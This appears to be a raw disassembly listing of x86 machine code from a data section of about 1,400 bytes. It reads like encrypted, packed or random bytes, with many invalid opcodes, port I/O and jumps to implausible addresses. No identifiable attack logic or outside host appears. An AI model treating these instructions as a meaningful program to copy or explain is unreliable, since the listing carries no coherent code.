  401ae3:	mov    ds:0xdaed72c8,eax
  401ae8:	add    cl,0x64
  401aeb:	in     eax,dx
  401aec:	test   al,0xb6
  401aee:	iret   
  401aef:	pop    edi
  401af0:	inc    esp
  401af1:	aam    0xbc
  401af3:	adc    eax,0xd0ff0dab
  401af8:	mul    DWORD PTR [edi]
  401afa:	sahf   
  401afb:	and    BYTE PTR [edx],0x2c
  401afe:	cmp    al,0xe6
  401b00:	jae    0x401b5e
  401b02:	and    eax,0x7ee02800
  401b07:	jae    0x401b47
  401b09:	or     al,0xc6
  401b0b:	dec    ebp
  401b0c:	dec    esp
  401b0d:	inc    ecx
  401b0e:	loope  0x401b10
  401b10:	push   ebx
  401b11:	loope  0x401b14
  401b13:	xor    DWORD PTR [eax],esp
  401b15:	ss je  0x401b60
  401b18:	in     al,dx
  401b19:	xchg   eax,edx
  401b1b:	mov    ebp,0x61d6f41f
  401b20:	sbb    al,0xbd
  401b22:	fisub  DWORD PTR gs:[ecx]
  401b25:	out    0x98,al
  401b27:	shl    ecx,1
  401b29:	jnp    0x401b64
  401b2b:	clc    
  401b2c:	or     eax,0x7f8eb61e
  401b31:	or     eax,0x3bff9a6
  401b36:	push   esi
  401b37:	scas   al,BYTE PTR es:[edi]
  401b38:	xor    al,0xb4
  401b3a:	sbb    ch,BYTE PTR [eax]
  401b3c:	in     al,dx
  401b3d:	pop    edi
  401b3e:	lods   al,BYTE PTR ds:[esi]
  401b3f:	adc    eax,0x5f6fa138
  401b44:	gs inc eax
  401b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b47:	hlt    
  401b48:	cs (bad) 
  401b4a:	mov    dl,0x30
  401b4c:	push   ecx
  401b4d:	enter  0x68eb,0xdd
  401b51:	lahf   
  401b52:	pop    ds
  401b53:	mov    ss,edi
  401b55:	or     al,0xfa
  401b57:	imul   edx,DWORD PTR [esp+ebp*2+0x47],0x21
  401b5c:	jg     0x401bc7
  401b5e:	sti    
  401b5f:	push   ebx
  401b60:	aad    0xbd
  401b62:	inc    ecx
  401b63:	push   ebp
  401b64:	xchg   esp,eax
  401b65:	fnstsw WORD PTR [esi]
  401b67:	or     DWORD PTR [eax],ebp
  401b69:	adc    DWORD PTR [ebp+edx*2-0x18],ecx
  401b6d:	inc    esi
  401b6e:	cmp    al,0x32
  401b70:	imul   edx,edi,0xffffffff
  401b73:	add    ecx,ecx
  401b75:	pop    eax
  401b76:	adc    DWORD PTR [eax+0x39],0xdb793e60
  401b7d:	mov    al,0x61
  401b7f:	adc    DWORD PTR [ecx+0x27],0xffffffb1
  401b83:	ret    
  401b84:	lahf   
  401b85:	xor    eax,0xcec5462a
  401b8a:	imul   edi,DWORD PTR [edx-0x56],0x48
  401b8e:	add    eax,eax
  401b90:	or     DWORD PTR [edx],0xc2371de
  401b96:	lea    edx,[ecx]
  401b98:	or     ch,ah
  401b9a:	loope  0x401b33
  401b9c:	xor    BYTE PTR [esi-0xe8e00b4],dl
  401ba2:	loope  0x401c14
  401ba4:	sub    al,cl
  401ba6:	xchg   esi,eax
  401ba7:	lea    edi,[ebp-0x7592bce1]
  401bad:	add    esi,DWORD PTR [esi]
  401baf:	mov    eax,0x8c12d1e8
  401bb4:	sbb    eax,0x4cb79fce
  401bb9:	fnstenv [esi+0x6b]
  401bbc:	mov    WORD PTR [edi-0x5d],es
  401bbf:	lods   eax,DWORD PTR ds:[esi]
  401bc0:	neg    bh
  401bc2:	mov    ds:0x84b59d44,eax
  401bc7:	sbb    bl,dh
  401bc9:	jecxz  0x401bdd
  401bcb:	repz arpl WORD PTR [ebp+0x3d],cx
  401bcf:	mov    esp,DWORD PTR [edx+esi*8]
  401bd2:	neg    DWORD PTR [esi]
  401bd4:	sbb    bl,ah
  401bd6:	fisub  DWORD PTR [edi+0x74b122f6]
  401bdc:	shl    BYTE PTR [ebx-0x6d2aa9e4],0x2d
  401be3:	pop    ebx
  401be4:	(bad)  
  401be5:	call   0xc843:0x4a06258e
  401bec:	mov    dh,0x6e
  401bee:	sub    ah,BYTE PTR [esp+edx*1-0x7720e847]
  401bf5:	xchg   ebx,eax
  401bf6:	fmul   QWORD PTR [edx-0x64]
  401bf9:	and    bl,BYTE PTR [ecx+0x227da833]
  401bff:	mov    ds:0x85b46262,al
  401c04:	jl     0x401c69
  401c06:	mov    DWORD PTR [ebx],ecx
  401c08:	push   esp
  401c09:	xchg   ebx,eax
  401c0a:	cmp    DWORD PTR ds:0x7d75b718,edi
  401c10:	gs sahf 
  401c12:	cdq    
  401c13:	daa    
  401c14:	adc    DWORD PTR [ebx-0x14],ebx
  401c17:	jl     0x401ba8
  401c19:	xchg   esp,eax
  401c1a:	cmp    eax,0xf6f12256
  401c1f:	jo     0x401c11
  401c21:	sub    DWORD PTR [esi+edx*8+0x1551d17f],0x8f2966f7
  401c2c:	sub    edi,edx
  401c2e:	rcl    DWORD PTR [ebx],1
  401c30:	push   edi
  401c31:	and    ebx,DWORD PTR [esi+edx*2-0xf]
  401c35:	pop    edi
  401c36:	sub    DWORD PTR [ebp-0x78ff2741],ecx
  401c3c:	adc    bl,BYTE PTR [ebx+ebx*8]
  401c3f:	adc    edi,DWORD PTR ds:0xc4422b64
  401c45:	cmc    
  401c46:	mov    dh,0x15
  401c48:	pop    ds
  401c49:	in     al,0x1c
  401c4b:	je     0x401bde
  401c4d:	push   esp
  401c4e:	int    0x97
  401c50:	xlat   BYTE PTR ds:[ebx]
  401c51:	shl    DWORD PTR [edx-0x81570f5],cl
  401c57:	js     0x401be0
  401c59:	in     al,dx
  401c5a:	and    dl,0xfb
  401c5d:	jg     0x401c9f
  401c5f:	clc    
  401c60:	push   ecx
  401c61:	inc    ecx
  401c62:	int3   
  401c63:	sbb    ebx,edx
  401c65:	mov    bl,0x93
  401c67:	inc    esp
  401c68:	push   esp
  401c69:	cwde   
  401c6a:	in     eax,dx
  401c6b:	mov    ds:0x77bad7,eax
  401c70:	ret    0xa44
  401c73:	out    0x61,al
  401c75:	inc    eax
  401c76:	popf   
  401c77:	ja     0x401c48
  401c79:	and    BYTE PTR [edx+0x5e],dl
  401c7c:	fwait
  401c7d:	leave  
  401c7e:	dec    ebp
  401c7f:	sahf   
  401c80:	jns    0x401cbb
  401c82:	xor    ebp,DWORD PTR [esi]
  401c84:	fsubr  DWORD PTR [ecx-0x73]
  401c87:	jo     0x401c73
  401c89:	jl     0x401c98
  401c8b:	xor    eax,0x6da3e8ae
  401c90:	iret   
  401c91:	mov    esp,0xd674922f
  401c96:	push   edi
  401c97:	push   0xffffffc4
  401c99:	div    BYTE PTR [edi-0x7a]
  401c9c:	adc    bl,BYTE PTR [eax-0x1861b99d]
  401ca2:	mov    edi,0x319ea209
  401ca7:	(bad)  
  401ca8:	aad    0x92
  401caa:	push   ss
  401cab:	stos   BYTE PTR es:[edi],al
  401cac:	addr16 xchg ebx,eax
  401cae:	fadd   QWORD PTR [ecx]
  401cb0:	or     dh,BYTE PTR [ebx-0x5f9f2fc1]
  401cb6:	dec    ecx
  401cb7:	adc    BYTE PTR [esi+0x5664a4dd],bl
  401cbd:	mov    ds:0x6adc8dfb,eax
  401cc2:	sub    DWORD PTR [esi+0xd],eax
  401cc5:	nop
  401cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cc7:	leave  
  401cc8:	xrelease mov DWORD PTR [ecx+edi*2+0x7fdedec8],ebp
  401cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd1:	jnp    0x401c62
  401cd3:	arpl   WORD PTR [ecx+0x5c961116],dx
  401cd9:	(bad)  
  401cda:	jecxz  0x401c66
  401cdc:	jns    0x401d11
  401cde:	add    edi,DWORD PTR [edi]
  401ce0:	mov    ds:0x55942da,al
  401ce5:	pop    es
  401ce6:	icebp  
  401ce7:	sbb    esi,DWORD PTR [ebx-0x1506d63b]
  401ced:	adc    bl,BYTE PTR [edi-0x92f5ca6]
  401cf3:	loope  0x401d55
  401cf5:	jmp    0x401cee
  401cf7:	ins    BYTE PTR es:[edi],dx
  401cf8:	sbb    al,0x69
  401cfa:	adc    ebx,DWORD PTR [ebp+0x29]
  401cfd:	inc    edi
  401cfe:	(bad)  
  401cff:	sub    al,0x3e
  401d01:	fsubr  DWORD PTR [edi+ecx*8+0x29834121]
  401d08:	es in  al,0xdd
  401d0b:	lock pop ss
  401d0d:	inc    esp
  401d0e:	fimul  DWORD PTR [ecx+eiz*4-0x21d1be44]
  401d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d16:	leave  
  401d17:	xor    al,0x3e
  401d19:	mov    bh,0x25
  401d1b:	cmp    BYTE PTR [edx+0x1f],0xcb
  401d1f:	scas   al,BYTE PTR es:[edi]
  401d20:	pop    ebp
  401d21:	leave  
  401d22:	mov    ebx,DWORD PTR [ebx+0xa]
  401d25:	hlt    
  401d26:	(bad)
  401d29:	jmp    0x401d73
  401d2b:	mov    al,ds:0xc0c6cd8e
  401d30:	push   esi
  401d31:	nop
  401d32:	pop    ebx
  401d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d34:	cmc    
  401d35:	js     0x401cb7
  401d37:	lods   eax,DWORD PTR ds:[esi]
  401d38:	sbb    DWORD PTR [ebp+0x4a],esi
  401d3b:	(bad)  
  401d3c:	loope  0x401ceb
  401d3e:	lods   al,BYTE PTR ds:[esi]
  401d3f:	jp     0x401daf
  401d41:	int3   
  401d42:	sbb    edi,edi
  401d44:	clc    
  401d45:	inc    esi
  401d46:	or     BYTE PTR [ebx+0x22],0xb9
  401d4a:	and    al,0x78
  401d4c:	idiv   DWORD PTR [edx+esi*4-0x4a799474]
  401d53:	ret    
  401d54:	(bad)  
  401d55:	xchg   edx,eax
  401d56:	ret    
  401d57:	imul   ebp,eax,0xffffffba
  401d5a:	cmp    BYTE PTR [eax],bl
  401d5c:	mov    cl,BYTE PTR [esi-0x70062e6d]
  401d62:	loop   0x401d1d
  401d64:	jmp    0x917bad9
  401d69:	cwde   
  401d6a:	fisttp QWORD PTR [esi]
  401d6c:	xchg   esi,eax
  401d6d:	ins    DWORD PTR es:[edi],dx
  401d6e:	push   0x311091f5
  401d73:	mov    cl,0x82
  401d75:	cld    
  401d76:	mov    bh,BYTE PTR [edi-0x77ab9a25]
  401d7c:	add    ebp,ecx
  401d7e:	fwait
  401d7f:	cmp    dh,ah
  401d81:	gs cmp ah,al
  401d84:	xor    al,0xa6
  401d86:	mov    ebp,0x881910e4
  401d8b:	addr16 iret 
  401d8d:	out    dx,al
  401d8e:	mov    dl,0x1f
  401d90:	add    eax,0x84b21691
  401d95:	jns    0x401deb
  401d97:	xor    al,0xb8
  401d99:	push   ds
  401d9a:	jae    0x401d5f
  401d9c:	sbb    ebx,DWORD PTR [eax]
  401d9e:	rdtsc  
  401da0:	stos   BYTE PTR es:[edi],al
  401da1:	pop    ecx
  401da2:	cld    
  401da3:	and    bl,bl
  401da5:	in     eax,0x27
  401da7:	lahf   
  401da8:	fs or  eax,0x454cc829
  401dae:	sub    esp,ebx
  401db0:	or     al,0xb8
  401db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db3:	pop    esp
  401db4:	jp     0x401dfc
  401db6:	pusha  
  401db7:	(bad)  
  401db8:	fadd   DWORD PTR [edx]
  401dba:	xchg   esp,edx
  401dbc:	sbb    ebp,DWORD PTR [ebx]
  401dbe:	int3   
  401dbf:	xchg   DWORD PTR [edx+0x1447ce32],esp
  401dc5:	push   edi
  401dc6:	push   ss
  401dc7:	jg     0x401d94
  401dc9:	mov    esi,0x8f254408
  401dce:	std    
  401dcf:	cwde   
  401dd0:	add    eax,0xc623041
  401dd5:	or     eax,0xfb95b7a9
  401dda:	mov    ah,0xac
  401ddc:	stos   DWORD PTR es:[edi],eax
  401ddd:	into   
  401dde:	mov    esp,0xebd27e27
  401de3:	jb     0x401d83
  401de5:	aam    0x5b
  401de7:	in     al,0xd
  401de9:	cli    
  401dea:	adc    eax,0xfffffff9
  401ded:	xor    DWORD PTR [edx],edi
  401def:	(bad)  
  401df1:	add    al,0x37
  401df3:	jge    0x401dd1
  401df5:	push   ebp
  401df6:	xor    edi,eax
  401df8:	xlat   BYTE PTR ds:[ebx]
  401df9:	push   0x1eeafeae
  401dfe:	int    0x2c
  401e00:	pop    ecx
  401e01:	inc    esp
  401e02:	and    bl,BYTE PTR [edx]
  401e04:	cld    
  401e05:	sub    eax,0x63b09279
  401e0a:	loop   0x401de6
  401e0c:	(bad)  
  401e0d:	out    dx,eax
  401e0e:	push   eax
  401e0f:	cmp    cl,al
  401e11:	mov    bl,0x65
  401e13:	adc    eax,0xa969238f
  401e18:	test   DWORD PTR [edi],edx
  401e1a:	out    dx,al
  401e1b:	test   al,0xf5
  401e1d:	sbb    al,0x9a
  401e1f:	fidivr DWORD PTR [edi-0x2d]
  401e22:	and    bl,BYTE PTR [edi+0x10a70b9]
  401e28:	mov    ebp,0x2b56c3b5
  401e2d:	and    bl,BYTE PTR [eax+0x29]
  401e30:	mov    edx,0xe20d61eb
  401e35:	test   BYTE PTR [eax],cl
  401e37:	sbb    ebx,DWORD PTR [eax+0x790c2e40]
  401e3d:	sbb    dl,BYTE PTR [edi+0x40]
  401e40:	cmp    eax,DWORD PTR [edx-0x1121ba1d]
  401e46:	es enter 0x491,0xe9
  401e4b:	retf   
  401e4c:	sub    al,0x50
  401e4e:	add    bh,bh
  401e50:	loope  0x401e85
  401e52:	mov    WORD PTR [edx-0x48],gs
  401e55:	push   ecx
  401e56:	mov    ebp,0x13ba960d
  401e5b:	iret   
  401e5c:	sbb    bl,BYTE PTR [ebx]
  401e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5f:	cmc    
  401e60:	ret    0x5e8b
  401e63:	ins    DWORD PTR es:[edi],dx
  401e64:	loope  0x401e71
  401e66:	sbb    DWORD PTR ds:[esi-0x1d06f611],eax
  401e6d:	jo     0x401e80
  401e6f:	addr16 hlt 
  401e71:	arpl   WORD PTR [esi-0x3c78a157],di
  401e77:	mov    bh,0x1b
  401e79:	gs addr16 in eax,0xe3
  401e7d:	iret   
  401e7e:	jae    0x401ee0
  401e80:	(bad)  [eax-0x5b676da9]
  401e86:	xchg   esp,eax
  401e87:	cmp    ebx,DWORD PTR [edx-0x29742bb]
  401e8d:	(bad)  
  401e8f:	adc    eax,0x16602e39
  401e94:	dec    edi
  401e95:	scas   al,BYTE PTR es:[edi]
  401e96:	sbb    bh,BYTE PTR [ebx]
  401e98:	xchg   edx,eax
  401e99:	cmp    al,0xf0
  401e9b:	cmovne esp,DWORD PTR [ebx-0x1f]
  401e9f:	ins    BYTE PTR es:[edi],dx
  401ea0:	sbb    al,0x45
  401ea2:	out    0x5d,eax
  401ea4:	ja     0x401e38
  401ea6:	repz cld 
  401ea8:	add    DWORD PTR [edx+0x1f613485],0x60b3201d
  401eb2:	jae    0x401e9c
  401eb4:	cmp    edx,DWORD PTR [ebp+0xc]
  401eb7:	pop    esi
  401eb8:	outs   dx,BYTE PTR ds:[esi]
  401eb9:	shl    esi,1
  401ebb:	bound  eax,QWORD PTR [ebp+0x7ec7b173]
  401ec1:	mov    ecx,0xe68146ad
  401ec6:	pop    esp
  401ec7:	mov    cl,BYTE PTR [ebx-0x498367af]
  401ecd:	lea    ebp,ss:[edx]
  401ed0:	call   FWORD PTR [eax+0x5e]
  401ed3:	adc    DWORD PTR ss:[edx],edi
  401ed6:	pop    ss
  401ed7:	call   0x2e7bf1b1
  401edc:	sbb    ecx,DWORD PTR [eax]
  401ede:	dec    ebp
  401edf:	and    BYTE PTR [eax],0xe2
  401ee2:	loopne 0x401f01
  401ee4:	je     0x401e8f
  401ee6:	inc    edi
  401ee7:	adc    eax,ebx
  401ee9:	cwde   
  401eea:	ja     0x401f0d
  401eec:	jmp    0xa9840a2d
  401ef1:	daa    
  401ef2:	std    
  401ef3:	pop    ss
  401ef4:	adc    BYTE PTR [esi+0x756fa35d],bh
  401efa:	fdivr  st,st(5)
  401efc:	sub    eax,0xe83e3f75
  401f01:	sahf   
  401f02:	clc    
  401f03:	and    al,0xe9
  401f05:	xor    esi,DWORD PTR [ecx+0x7d]
  401f08:	xchg   esi,eax
  401f09:	xor    BYTE PTR [eax+0x29],bl
  401f0c:	gs cdq 
  401f0e:	outs   dx,BYTE PTR ds:[esi]
  401f0f:	fistp  QWORD PTR [ebp-0x612a911]
  401f15:	or     al,0xa7
  401f17:	jmp    0x30b1:0x26171bfb
  401f1e:	or     eax,0xe1444f4
  401f23:	adc    eax,0xde1a42d1
  401f28:	inc    esi
  401f29:	jb     0x401f74
  401f2b:	xchg   esi,eax
  401f2c:	call   0x33066355
  401f31:	push   ecx
  401f32:	mov    bh,0x9e
  401f34:	ins    BYTE PTR es:[edi],dx
  401f35:	sbb    BYTE PTR [ecx+0x6c],0x79
  401f39:	ror    BYTE PTR [ebx],0x97
  401f3c:	inc    ebx
  401f3d:	xor    ebx,DWORD PTR [ecx-0x20]
  401f40:	(bad)  
  401f41:	or     ecx,edx
  401f43:	gs jne 0x401f7d
  401f46:	aam    0xbb
  401f48:	je     0x401f7c
  401f4a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  401f4c:	test   DWORD PTR [ebx-0x38],ebp
  401f4f:	hlt    
  401f50:	and    eax,0x60893c64
  401f55:	js     0x401fa1
  401f57:	push   0x37a4e825
  401f5c:	add    bl,BYTE PTR [ebp-0x62]
  401f5f:	pop    es
  401f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f61:	outs   dx,BYTE PTR ds:[esi]
  401f62:	out    dx,eax
  401f63:	add    ah,BYTE PTR [ecx-0x39ced93a]
  401f69:	clc    
  401f6a:	popa   
  401f6b:	dec    edi
  401f6c:	popf   
  401f6d:	sub    edi,DWORD PTR [edx+0x290f21cd]
  401f73:	push   ebp
  401f74:	jmp    0xc24fd1a9
  401f79:	addr16 pop ebx
  401f7b:	xchg   bl,bl
  401f7d:	xor    esp,edx
  401f7f:	ja     0x401f14
  401f81:	mov    edx,0xbb14b610
  401f86:	xor    al,0x52
  401f88:	aad    0x1e
  401f8a:	mov    ds:0xe02005d1,al
  401f8f:	push   eax
  401f90:	je     0x401fb2
  401f92:	sahf   
  401f93:	sar    esp,cl
  401f95:	aaa    
  401f96:	pop    eax
  401f97:	loopne 0x401ffe
  401f99:	push   ds
  401f9a:	xchg   ecx,eax
  401f9b:	jb     0x401fdb
  401f9d:	xor    DWORD PTR [ecx-0x41],esi
  401fa0:	adc    al,BYTE PTR [esi]
  401fa2:	retf   0x2270
  401fa5:	ja     0x401f8d
  401fa7:	and    dl,0xed
  401faa:	stos   BYTE PTR es:[edi],al
  401fab:	dec    ecx
  401fac:	in     eax,dx
  401fad:	mov    esi,DWORD PTR [esi]
  401faf:	mov    edx,0xadd7611e
  401fb4:	xor    ebx,DWORD PTR [eax]
  401fb6:	jno    0x401ffa
  401fb8:	dec    ebx
  401fb9:	out    0xfa,eax
  401fbb:	push   ss
  401fbc:	and    DWORD PTR [ebx+0x58cfe724],esp
  401fc2:	cmp    esp,DWORD PTR [edx-0x6936d101]
  401fc8:	outs   dx,DWORD PTR ds:[esi]
  401fc9:	in     eax,0xe2
  401fcb:	gs mov esi,0x9eb11d08
  401fd1:	or     eax,0x8b570e5
  401fd6:	xor    al,0x13
  401fd8:	into   
  401fd9:	mov    WORD PTR [eax-0x23],ss
  401fdc:	fwait
  401fdd:	mov    dl,0x2f
  401fdf:	mov    bl,0x68
  401fe1:	out    0x7b,al
  401fe3:	dec    edi
  401fe4:	pop    ecx
  401fe5:	dec    ebx
  401fe6:	int    0xfd
  401fe8:	in     eax,0x78
  401fea:	dec    ebx
  401feb:	or     dl,BYTE PTR [edi-0x395ee77d]
  401ff1:	pop    ebx
  401ff2:	push   edi
  401ff3:	inc    eax
  401ff4:	sti    
  401ff5:	push   ds
  401ff6:	pop    ecx
  401ff7:	xor    eax,esi
  401ff9:	into   
  401ffa:	jno    0x401fac
  401ffc:	cmc    
  401ffd:	sbb    esp,DWORD PTR [ebx+0xf7108eb]
  402003:	sub    al,0x47
  402005:	xchg   edi,eax
  402006:	push   eax
  402007:	pop    ebx
  402008:	in     eax,dx
  402009:	xchg   ecx,eax
  40200a:	mov    al,ds:0x814cf63e
  40200f:	mov    DWORD PTR [edx-0x6e],edi
  402012:	lods   al,BYTE PTR ds:[esi]
  402013:	(bad)  
  402014:	mov    ebp,0xf5d46265
  402019:	mov    dl,0xa6
  40201b:	out    dx,al
  40201c:	sbb    DWORD PTR [ebx-0x41],ebx
  40201f:	sub    ah,cl
  402021:	aaa    
  402022:	push   esp
  402023:	push   ebx
  402024:	mov    ah,0x3b
  402026:	clc    
  402027:	add    edi,DWORD PTR [edx]
  402029:	pop    esi
  40202a:	cmp    ah,cl
  40202c:	je     0x402006
  40202e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40202f:	ds stos WORD PTR es:[edi],ax
  402032:	test   DWORD PTR [ecx],esp
  402034:	mov    ebx,eax
  402036:	xor    DWORD PTR [ebx+0x620da03c],ebp
  40203c:	add    dl,ch
  40203e:	popa   
  40203f:	push   ds
  402040:	rol    esi,0xbe
  402043:	inc    ebp
  402044:	ret    0xfd01
  402047:	das    
  402048:	ror    BYTE PTR [ebx+0x4f],0x49
  40204c:	(bad)  
  40204e:	mov    al,0x6
  402050:	rcl    dl,1
  402052:	or     edi,DWORD PTR [ebx-0x5eeba7da]
  402058:	cli    
  402059:	rcl    esp,1
  40205b:	repz xchg edx,eax
  40205d:	and    bl,BYTE PTR [edx]
  40205f:	jbe    0x40208e
  402061:	sbb    al,0x9c
  402063:	bound  edi,QWORD PTR [esi-0x61]
  402066:	jl     0x401fee
  402068:	(bad)  
  402069:	loop   0x402054
  40206b:	loope  0x40209e
  40206d:	in     al,0xec
  40206f:	scas   eax,DWORD PTR es:[edi]
  402070:	xor    al,0x30
  402072:	(bad)  
  402073:	xchg   ebp,eax
  402074:	sub    BYTE PTR [esi],0xbe
  402077:	sti    
  402078:	mov    ah,al
  40207a:	or     al,0x6a
  40207c:	add    BYTE PTR [edi+0x17],ah
  40207f:	aad    0x28
  402081:	gs jmp 0x4020a1
  402084:	mov    bl,0x21
  402086:	or     ebp,ebx
  402088:	sub    ebp,DWORD PTR cs:[esi+ebp*1-0x692746d1]
  402090:	rcl    BYTE PTR [esi],1
  402092:	dec    esi
  402093:	nop
  402094:	int    0x1b
  402096:	stc    
  402097:	aam    0xc5
  402099:	dec    esp
  40209a:	leave  
  40209b:	inc    edx
  40209c:	call   0x9f9:0xababe77c
  4020a3:	and    BYTE PTR [eax-0x3bb20280],al
  4020a9:	sbb    DWORD PTR [ebx-0x1215fc8a],edx
  4020af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b0:	imul   ecx,DWORD PTR [ebx+ebx*1+0x7a],0xe4fa7d2b
  4020b8:	push   eax
  4020b9:	ret    
  4020ba:	call   0xefff:0x491413a5
  4020c1:	mov    esi,0x99ab01c
  4020c6:	xchg   edx,eax
  4020c7:	jno    0x40211a
  4020c9:	adc    DWORD PTR [ebx-0x76],esp
  4020cc:	jmp    0x9d75:0x5c47f6f
  4020d3:	adc    edx,DWORD PTR [eax]
  4020d5:	retf   
  4020d6:	push   ebx
  4020d7:	push   eax
  4020d8:	xor    BYTE PTR [eax-0x11266936],dl
  4020de:	sbb    dh,BYTE PTR [esi+ecx*2]
  4020e1:	jbe    0x4020f2
  4020e3:	neg    BYTE PTR [ecx+0x1c]
  4020e6:	ds add eax,0xee1fa396
  4020ec:	lahf   
  4020ed:	mov    dl,0xb
  4020ef:	mov    ecx,0xfc2e8251
  4020f4:	(bad)  
  4020f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020f6:	push   es
  4020f7:	sti    
  4020f8:	push   esp
  4020f9:	int    0x7c
  4020fb:	fst    DWORD PTR [ebp-0x3d]
  4020fe:	inc    esp
  4020ff:	addr16 loop 0x402168
  402102:	mov    cs,WORD PTR [ebx]
  402104:	fidiv  WORD PTR [eax]
  402106:	mov    WORD PTR [edx+0x669cafeb],ds
  40210c:	cwde   
  40210d:	pop    eax
  40210e:	dec    ebx
  40210f:	out    dx,al
  402110:	imul   edx,DWORD PTR [ecx-0x63365f88],0xffffffa4
  402117:	outs   dx,BYTE PTR ds:[esi]
  402118:	mul    BYTE PTR [edi]
  40211a:	sub    bl,BYTE PTR [edi-0x48c0b0b9]
  402120:	lods   al,BYTE PTR ds:[esi]
  402121:	xchg   ebp,eax
  402122:	fisubr WORD PTR [edx-0x4f]
  402125:	out    0xe7,al
  402127:	pop    ebp
  402128:	push   eax
  402129:	pop    ss
  40212a:	sbb    edx,ecx
  40212c:	push   0xffffffb3
  40212e:	sub    ebp,DWORD PTR [ecx]
  402130:	inc    ebp
  402131:	jp     0x4020f7
  402133:	sahf   
  402134:	mov    dl,0xc5
  402136:	aad    0xa
  402138:	jmp    0x402151
  40213a:	addr16 pop ecx
  40213c:	(bad)
  40213f:	imul   esi,DWORD PTR [edi],0xffffffff
  402142:	mov    edi,0xb09f836e
  402147:	(bad)  
  402148:	sbb    al,0xb0
  40214a:	test   eax,0xb7dd20cc
  40214f:	mov    esp,0xd97601a7
  402154:	jns    0x402190
  402156:	arpl   WORD PTR [ecx-0x4e],bp
  402159:	fcmovb st,st(3)
  40215b:	fcomi  st,st(1)
  40215d:	mov    DWORD PTR [edx],eax
  40215f:	cli    
  402160:	or     al,dl
  402162:	cmp    BYTE PTR [ecx],bl
  402164:	add    BYTE PTR [ecx],cl
  402166:	xchg   DWORD PTR [eax+0x2fb3ed28],edx
  40216c:	adc    al,0x19
  40216e:	adc    ah,cl
  402170:	jb     0x402134
  402172:	call   0x13a5:0xb9a1dc1d
  402179:	pop    ebx
  40217a:	jne    0x4021be
  40217c:	stos   DWORD PTR es:[edi],eax
  40217d:	adc    DWORD PTR [eax+0x7],esp
  402180:	cwde   
  402181:	and    BYTE PTR ds:0x7a488daa,dl
  402187:	das    
  402188:	imul   esp,DWORD PTR ss:[edx],0xd
  40218c:	adc    eax,0x5407eca3
  402191:	cdq    
  402192:	inc    edi
  402193:	and    eax,0xada50fe0
  402198:	inc    esi
  402199:	jb     0x40215b
  40219b:	sar    BYTE PTR [edi+edi*1+0x40ba8dc1],1
  4021a2:	mov    edi,0x5ea2966c
  4021a7:	leave  
  4021a8:	popf   
  4021a9:	cmp    DWORD PTR [eax+0x160a7e8b],0x38b3ccc0
  4021b3:	lock xor ecx,DWORD PTR fs:[ebx+0x7059d9a2]
  4021bb:	setne  BYTE PTR [ebx+0x2b]
  4021bf:	dec    ebx
  4021c0:	inc    edi
  4021c1:	mov    ds:0xd3ed2bcf,al
  4021c6:	adc    ecx,ebx
  4021c8:	adc    DWORD PTR [edx],eax
  4021ca:	cmc    
  4021cb:	fdiv   st(1),st
  4021cd:	and    dh,dl
  4021cf:	cmp    ecx,DWORD PTR [ecx-0xa]
  4021d2:	test   BYTE PTR ds:0x9b1d7ec2,dl
  4021d8:	or     bh,bl
  4021da:	popf   
  4021db:	je     0x402203
  4021dd:	loopne 0x402171
  4021df:	push   eax
  4021e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e1:	dec    esp
  4021e2:	(bad)  
  4021e3:	js     0x402206
  4021e5:	(bad)  
  4021e6:	mov    ah,0xa6
  4021e8:	popf   
  4021e9:	ss fwait
  4021eb:	jae    0x4021ef
  4021ed:	scas   al,BYTE PTR es:[edi]
  4021ee:	pop    esp
  4021ef:	call   FWORD PTR [eax-0x4]
  4021f2:	dec    esi
  4021f3:	(bad)  
  4021f5:	retf   
  4021f6:	retf   
  4021f7:	jmp    0xae42:0xdea1b952
  4021fe:	nop
  4021ff:	cmp    ebp,DWORD PTR [esi]
  402201:	add    eax,0xc17883c4
  402206:	push   cs
  402207:	pop    esp
  402208:	xchg   ecx,eax
  402209:	jno    0x402251
  40220b:	fmul   st(3),st
  40220d:	stos   DWORD PTR es:[edi],eax
  40220e:	sub    eax,0x89aaa2e3
  402213:	out    dx,al
  402214:	ds sub al,0xc5
  402217:	adc    al,0xb2
  402219:	or     al,0x7d
  40221b:	push   cs
  40221c:	cdq    
  40221d:	jmp    0x40228f
  40221f:	adc    ebp,DWORD PTR ds:[edi-0x620e6b4f]
  402226:	dec    esi
  402227:	inc    edx
  402228:	push   ss
  402229:	xor    BYTE PTR ds:0x3071811a,al
  40222f:	icebp  
  402230:	mov    edx,0x1fe15cad
  402235:	dec    esi
  402236:	sub    al,0x35
  402238:	push   ds
  402239:	jp     0x4022a8
  40223b:	mov    edi,0xa5e90e58
  402240:	dec    ebx
  402241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402242:	in     ax,dx
  402244:	jne    0x402291
  402246:	mov    bp,0xa2fe
  40224a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40224b:	repnz mov esi,0x9d4243f
  402251:	test   BYTE PTR [eax],dl
  402253:	dec    edi
  402254:	es inc esi
  402256:	mov    ds:0x9bb7cdf8,eax
  40225b:	mov    ebp,0x6986a158
  402260:	sub    al,0xd4
  402262:	pop    eax
  402263:	adc    al,0x92
  402265:	pop    ds
  402266:	scas   al,BYTE PTR es:[edi]
  402267:	adc    al,0x40
  402269:	xchg   ebp,eax
  40226a:	dec    ebp
  40226b:	out    dx,al
  40226c:	icebp  
  40226d:	cmp    eax,0x7ebeeed3
  402272:	test   eax,0x170a21b4
  402277:	fld    TBYTE PTR [esi]
  402279:	xor    eax,ebp
  40227b:	jo     0x40225c
  40227d:	add    DWORD PTR [edx],eax
  40227f:	mov    dl,0x47
  402281:	gs push edi
  402283:	jne    0x4022bb
